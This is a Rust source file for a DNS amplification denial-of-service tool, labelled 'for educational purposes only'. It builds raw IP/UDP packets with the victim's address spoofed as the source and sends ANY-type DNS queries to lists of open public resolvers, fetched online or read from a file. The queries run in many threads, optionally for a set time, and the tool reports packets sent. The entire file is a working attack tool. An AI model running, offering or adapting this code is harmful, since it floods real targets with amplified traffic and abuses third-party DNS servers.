// DNS Amplification Script
// Author: David Stromberger
// License: MIT
// Version: 0.1.0
// Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.

use std::fs::File;
use std::io::{self, BufRead, BufReader, Error, ErrorKind};
use std::mem::size_of;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::{mem, thread};

use clap::{arg, command, Parser};

use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::Packet;

use reqwest;
use tokio;
use tokio::time::Instant;

use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};

static mut PACKETS_SENT: u64 = 0;

fn colorize(text: &str, color: &str) -> String {
    let color = match color {
        "red" => "31",
        "green" => "32",
        "yellow" => "33",
        "blue" => "34",
        "magenta" => "35",
        "cyan" => "36",
        "white" => "37",
        _ => "0",
    };
    format!("\x1B[{}m{}\x1B[0m", color, text)
}

async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?.text().await?;
    let servers = response.lines().map(|s| s.trim().to_string()).collect();
    Ok(servers)
}

fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
    let file = File::open(file)?;
    let reader = BufReader::new(file);

    let mut dns_servers = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let line = line.trim();

        if !line.is_empty() && !line.starts_with('#') {
            dns_servers.push(line.to_owned());
        }
    }

    Ok(dns_servers)
}

fn send_dns_query(
    dst_ip: Ipv4Addr,
    domain: &str,
    source_ip: Ipv4Addr,
    source_port: u16,
    record_type: &str,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let dns_query_payload = build_dns_query(domain, record_type);
    let udp_payload = build_udp_packet(source_port, 53, source_ip, dst_ip, &dns_query_payload);
    let ip_payload = build_ip_packet(source_ip, dst_ip, &udp_payload);

    match send_raw_packet(dst_ip, &ip_payload) {
        Ok(_) => (),
        Err(err) => return Err(Box::new(err)),
    }

    Ok(())
}

fn build_dns_query(domain: &str, record_type: &str) -> Vec<u8> {
    let mut header = [0u8; 12];

    // Transaction ID (random)
    let transaction_id: u16 = rand::random();
    header[0] = (transaction_id >> 8) as u8;
    header[1] = transaction_id as u8;

    // Flags (standard query, recursion desired)
    header[2] = 0x01; // Standard query
    header[5] = 0x01; // Recursion desired

    let mut question = Vec::new();

    // Domain name
    for part in domain.split('.') {
        question.push(part.len() as u8);
        question.extend(part.as_bytes());
    }
    question.push(0); // End of domain name

    let mut record_type_num: u16 = 0x00ff; // Default value for "ANY"
    match record_type {
        "A" => record_type_num = 0x0001,
        "MX" => record_type_num = 0x000f,
        "NS" => record_type_num = 0x0002,
        _ => (), // do nothing for unsupported record types
    }

    question.extend(&record_type_num.to_be_bytes()); // Record type (big-endian)
    question.extend(&0x0001u16.to_be_bytes()); // Record class (big-endian)

    // Combine header and question to form the complete DNS query
    let mut dns_query_buffer = Vec::new();
    dns_query_buffer.extend(&header);
    dns_query_buffer.extend(&question);

    dns_query_buffer
}

fn build_udp_packet(
    src_port: u16,
    dst_port: u16,
    source_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    payload: &[u8],
) -> Vec<u8> {
    let mut udp_packet = MutableUdpPacket::owned(vec![0u8; 8 + payload.len()]).unwrap();

    udp_packet.set_source(src_port);
    udp_packet.set_destination(dst_port);
    udp_packet.set_payload(&payload);
    udp_packet.set_length(8 + payload.len() as u16);

    let checksum =
        pnet::packet::udp::ipv4_checksum(&udp_packet.to_immutable(), &source_ip, &dst_ip);
    udp_packet.set_checksum(checksum);

    udp_packet.to_immutable().packet().to_vec()
}

fn build_ip_packet(source_ip: Ipv4Addr, dst_ip: Ipv4Addr, payload: &[u8]) -> Vec<u8> {
    let mut ipv4_packet = MutableIpv4Packet::owned(vec![0u8; 20 + payload.len()]).unwrap();

    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(20 + payload.len() as u16);
    ipv4_packet.set_dscp(0);
    ipv4_packet.set_ecn(0);
    ipv4_packet.set_identification(0x1234);
    ipv4_packet.set_flags(0);
    ipv4_packet.set_fragment_offset(0);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Udp);
    ipv4_packet.set_source(source_ip);
    ipv4_packet.set_destination(dst_ip);
    ipv4_packet.set_payload(&payload);

    let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
    ipv4_packet.set_checksum(checksum);

    ipv4_packet.to_immutable().packet().to_vec()
}

fn send_raw_packet(dst_ip: Ipv4Addr, packet: &[u8]) -> Result<(), Error> {
    let sock = match unsafe { libc::socket(AF_INET, SOCK_RAW, IPPROTO_RAW) } {
        -1 => {
            return Err(Error::last_os_error());
        }
        fd => fd,
    };

    let sockaddr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: 0,
        sin_addr: libc::in_addr {
            s_addr: u32::from(dst_ip).to_be(),
        },
        ..unsafe { mem::zeroed() }
    };
    let sockaddr_ptr = &sockaddr as *const _ as *const sockaddr;

    let send_bytes = unsafe {
        sendto(
            sock,
            packet.as_ptr() as *const libc::c_void,
            packet.len(),
            0,
            sockaddr_ptr,
            size_of::<sockaddr_in>() as libc::socklen_t,
        )
    };

    if send_bytes != packet.len() as isize {
        let err = Error::new(ErrorKind::Other, "Failed to send packet");
        unsafe { libc::close(sock) };
        return Err(err);
    }

    let res = unsafe { libc::close(sock) };
    if res == -1 {
        return Err(Error::last_os_error());
    }

    Ok(())
}

fn amplify(
    dns_servers: &Vec<String>,
    domain: &str,
    source_ip: &str,
    source_port: u16,
    record_type: &str,
    aborted: Arc<AtomicBool>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    if aborted.load(Ordering::Relaxed) {
        return Ok(());
    }
    let source_ip = match Ipv4Addr::from_str(source_ip) {
        Ok(ip) => ip,
        Err(_) => return Err("Invalid source IP address".into()),
    };
    loop {
        for dns_server in dns_servers {
            let dns_server = match Ipv4Addr::from_str(dns_server) {
                Ok(ip) => ip,
                Err(_) => {
                    println!("Invalid DNS server address: {}", dns_server);
                    continue;
                }
            };
            match send_dns_query(dns_server, domain, source_ip, source_port, record_type) {
                Ok(()) => unsafe {
                    PACKETS_SENT += 1;
                },
                Err(_e) => {
                    continue;
                }
            }
        }
    }
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address of the target
    #[arg(required = true)]
    target: String,
    /// Port of the target
    #[arg(required = true)]
    port: u16,
    /// Record type to use
    #[arg(
        short = 'r',
        long = "record-type",
        required = false,
        default_value = "ANY"
    )]
    record_type: Option<String>,
    /// List of dns servers to use
    #[arg(short, long, required = false)]
    server_list: Option<String>,
    /// Time the attack should run
    #[arg(short, long, required = false)]
    time: Option<u64>,
    /// Domain to resolve
    #[arg(
        short = 'd',
        long = "domain",
        required = false,
        default_value = "google.com"
    )]
    domain: Option<String>,
    /// Thread count
    #[arg(short = 'm', long = "threads", required = false, default_value = "10")]
    threads: Option<u16>,
    /// DNS resolver to use
    #[arg(short = 'n', long = "dns-resolver", required = false)]
    dns_resolver: Option<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root!");
        std::process::exit(1);
    }

    let args = Args::parse();

    let record_type = args.record_type.unwrap();
    let source_ip = args.target;
    let source_port = args.port;
    let time = args.time;
    let domain = args.domain.unwrap();
    let threads = args.threads.unwrap();
    let dns_servers: Vec<String>;

    if args.server_list.is_none() && args.dns_resolver.is_none() {
        dns_servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
    } else if args.dns_resolver.is_some() {
        dns_servers = args.dns_resolver.map(|s| vec![s]).unwrap_or(vec![]);
    } else {
        dns_servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
    }

    let aborted = Arc::new(AtomicBool::new(false));
    let mut handles = vec![];

    println!(
        "Attack on {} started with {} threads...",
        colorize(&source_ip, "green"),
        colorize(&threads.to_string(), "red")
    );

    let start_time = Instant::now();
    let source_ip_clone = source_ip.clone();

    thread::spawn(move || loop {
        let elapsed_time = start_time.elapsed();
        println!(
            "Attack on {} running for {} seconds with {} packets sent...",
            colorize(&source_ip_clone.to_string(), "green"),
            colorize(&elapsed_time.as_secs().to_string(), "red"),
            colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
        );
        thread::sleep(Duration::from_secs(1));
    });

    for _ in 0..threads {
        let dns_servers = dns_servers.clone();
        let domain = domain.clone();
        let source_ip = source_ip.clone();
        let record_type = record_type.clone();
        let aborted = aborted.clone();

        let handle = thread::spawn(move || {
            let _ = amplify(
                &dns_servers,
                &domain,
                &source_ip,
                source_port,
                &record_type,
                aborted,
            );
        });

        handles.push(handle);
    }

    if let Some(time) = time {
        thread::sleep(Duration::from_secs(time));
        aborted.store(true, Ordering::Relaxed);
    } else {
        for handle in handles {
            handle.join().unwrap();
        }
    }

    println!(
        "Attack on {} finished after {} seconds with {} packets sent.",
        colorize(&source_ip.to_string(), "green"),
        colorize(&start_time.elapsed().as_secs().to_string(), "red"),
        colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
    );

    Ok(())
}
